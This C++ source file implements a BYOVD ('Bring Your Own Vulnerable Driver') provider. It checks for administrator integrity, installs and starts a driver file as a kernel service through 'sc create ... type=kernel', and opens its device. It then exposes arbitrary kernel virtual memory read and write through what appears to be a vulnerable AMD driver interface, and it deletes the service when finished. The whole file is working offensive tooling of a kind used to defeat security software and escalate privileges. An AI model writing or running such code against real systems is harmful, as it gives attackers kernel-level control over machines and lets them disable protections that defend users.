#include <byovd.h>
#include <amd.h>

bool BYOVD_PROVIDER::is_mandatory_high_process()
{
    DWORD dwLengthNeeded = 0;
    bool result = false;
    GetTokenInformation(GetCurrentProcessToken(), TokenIntegrityLevel, NULL, 0, &dwLengthNeeded);
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLengthNeeded);
    if (GetTokenInformation(GetCurrentProcessToken(), TokenIntegrityLevel, pTIL, dwLengthNeeded, &dwLengthNeeded))
    {
        auto dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
        if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
        {
            result = true;
        }
    }
    LocalFree(pTIL);
    return result;
}

void BYOVD_PROVIDER::remove_service()
{
    char service_stop[FILENAME_MAX];
    sprintf_s(service_stop, "sc stop %s>NUL", _service_name);
    system(service_stop);

    char service_delete[FILENAME_MAX];
    sprintf_s(service_delete, "sc delete %s>NUL", _service_name);
    system(service_delete);
}

bool BYOVD_PROVIDER::file_exists()
{
  DWORD dwAttrib = GetFileAttributesA(_driver_path);
  return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
};

void BYOVD_PROVIDER::create_service()
{
    char service_create[FILENAME_MAX * 2];
    memset(service_create, 0x0, FILENAME_MAX * 2);
    sprintf_s(service_create, "sc create %s binpath=\"%s\" type=kernel>NUL", _service_name, _driver_path);
    system(service_create);

    char service_start[FILENAME_MAX];
    memset(service_start, 0x0, FILENAME_MAX);
    sprintf_s(service_start, "sc start %s>NUL", _service_name);
    system(service_start);
};

bool BYOVD_PROVIDER::load_driver() 
{
    if (is_mandatory_high_process())
    {
        char device_string[FILENAME_MAX];
        memset(device_string, 0x0, FILENAME_MAX);
        strcat_s(device_string, "\\\\.\\");
        strcat_s(device_string, _device_name);
        _device = CreateFileA(device_string, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (_device == INVALID_HANDLE_VALUE)
        {
            if (!file_exists())
            {
                std::cout << "[!] could not find driver in path [" << _driver_path << "]" << std::endl;
                return false;
            }
            std::cout << "[+] remove service" << std::endl;
            remove_service();

            std::cout << "[+] create new service" << std::endl;
            create_service();
            _device = CreateFileA(device_string, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        }
        std::cout << "[+] open driver handle" << std::endl;
        return true;
    }
    else 
    {
        std::cout << "Need Administrator privileges to manage services!" << std::endl;
        return false;
    }
}

bool BYOVD_PROVIDER::WriteVirtualMemory(ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes)
{
    if (_device == INVALID_HANDLE_VALUE)
    {
        if (load_driver()) return amd::WriteVirtualMemory(_device, Address, Buffer, NumberOfBytes) == TRUE ? true : false;
        else return false;
    }
    return amd::WriteVirtualMemory(_device, Address, Buffer, NumberOfBytes) == TRUE ? true : false;
}

bool BYOVD_PROVIDER::ReadVirtualMemory(ULONG_PTR Address, PVOID Buffer, ULONG NumberOfBytes)
{
    if (_device == INVALID_HANDLE_VALUE)
    {
        if (load_driver()) return amd::ReadVirtualMemory(_device, Address, Buffer, NumberOfBytes) == TRUE ? true : false;
        else return false;
    }
    return amd::ReadVirtualMemory(_device, Address, Buffer, NumberOfBytes) == TRUE ? true : false;
}

BYOVD_PROVIDER::BYOVD_PROVIDER(const std::string& driver_name, const std::string& device_name)
{
    memset(_service_name, 0x0, FILENAME_MAX);
    memset(_driver_name, 0x0, FILENAME_MAX);
    memset(_device_name, 0x0, FILENAME_MAX);
    memset(_driver_path, 0x0, FILENAME_MAX);

    strcat_s(_service_name, "byovd_provider");
    strcat_s(_driver_name, driver_name.c_str());
    strcat_s(_device_name, device_name.c_str());

    GetCurrentDirectoryA(FILENAME_MAX, _driver_path);
    strcat_s(_driver_path, "\\");
    strcat_s(_driver_path, _driver_name);
};

BYOVD_PROVIDER::~BYOVD_PROVIDER()
{
    if (_device != INVALID_HANDLE_VALUE) remove_service();
};
